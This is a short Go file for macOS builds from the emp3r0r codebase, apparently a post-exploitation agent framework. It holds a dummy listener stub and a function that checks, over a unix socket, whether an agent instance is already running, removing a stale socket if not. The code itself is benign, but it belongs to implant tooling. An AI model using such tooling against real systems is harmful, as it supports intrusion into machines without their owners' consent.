//go:build darwin
// +build darwin

package main

import (
	"log"
	"net"
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
)

// Dummy implementation for darwin build

func socketListen() {
	log.Println("socketListen dummy for darwin")
}

func isAgentAliveSocket() bool {
	log.Printf("Checking if agent is alive via socket %s", common.RuntimeConfig.SocketName)
	conn, err := net.Dial("unix", common.RuntimeConfig.SocketName)
	if err != nil {
		log.Printf("Agent seems dead: %v, removing socket to bind", err)
		err := os.Remove(common.RuntimeConfig.SocketName)
		if err != nil {
			log.Printf("Failed to remove socket: %v", err)
		}
		return false
	}
	defer conn.Close()
	return agentutils.IsAgentAlive(conn)
}
